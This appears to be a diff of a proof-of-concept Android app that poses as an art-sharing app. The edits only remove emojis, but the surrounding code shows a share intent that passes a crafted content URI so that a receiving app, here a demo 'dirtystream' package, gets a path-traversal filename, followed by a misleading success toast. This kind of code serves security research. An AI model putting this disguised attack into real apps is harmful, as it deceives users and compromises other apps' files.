@@ -23,7 +23,7 @@ class MuseumActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        Log.d(TAG, "🎨 Museum Activity starting...")
+        Log.d(TAG, "Museum Activity starting...")
 
         setContent {
             MuseumTheme {
@@ -45,11 +45,11 @@ class MuseumActivity : ComponentActivity() {
      */
     private fun shareArtwork(artwork: MuseumObject) {
         try {
-            Log.d(TAG, "🎨 Sharing artwork: ${artwork.title}")
+            Log.d(TAG, "Sharing artwork: ${artwork.title}")
 
             // Create innocent sharing text that users would actually want to share
             val shareText = """
-🎨 Check out this amazing artwork! 🎨
+Check out this amazing artwork!
 
 "${artwork.title}" by ${artwork.artistDisplayName}
 From: ${artwork.repository}
@@ -67,7 +67,7 @@ Shared via Art Explorer app ✨
                 putExtra(Intent.EXTRA_TEXT, shareText)
                 putExtra(Intent.EXTRA_SUBJECT, "Beautiful Artwork: ${artwork.title}")
 
-                // 🚨 HIDDEN ATTACK: Add malicious URI that triggers path traversal
+                // HIDDEN ATTACK: Add malicious URI that triggers path traversal
                 // This URI will cause the ArtworkContentProvider to return a malicious filename
                 val maliciousUri = Uri.parse("content://com.artexplorer.museum.artworks/share/${artwork.objectID}")
                 putExtra(Intent.EXTRA_STREAM, maliciousUri)
@@ -78,11 +78,11 @@ Shared via Art Explorer app ✨
                         "com.example.dirtystream",
                         "com.example.dirtystream.MainActivity"
                     )
-                    Log.d(TAG, "🎯 Targeting DirtyStream app directly")
+                    Log.d(TAG, " Targeting DirtyStream app directly")
                 } catch (e: Exception) {
                     // If DirtyStream app not found, let user choose from available apps
                     component = null
-                    Log.d(TAG, "📤 Opening generic share dialog")
+                    Log.d(TAG, " Opening generic share dialog")
                 }
 
                 addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
@@ -95,7 +95,7 @@ Shared via Art Explorer app ✨
             // Show innocent success message - user has no idea an attack just happened!
             Toast.makeText(
                 this,
-                "✨ Artwork shared successfully! Thank you for spreading art appreciation! 🎨",
+                "Artwork shared successfully! Thank you for spreading art appreciation!",
                 Toast.LENGTH_LONG
             ).show()
 
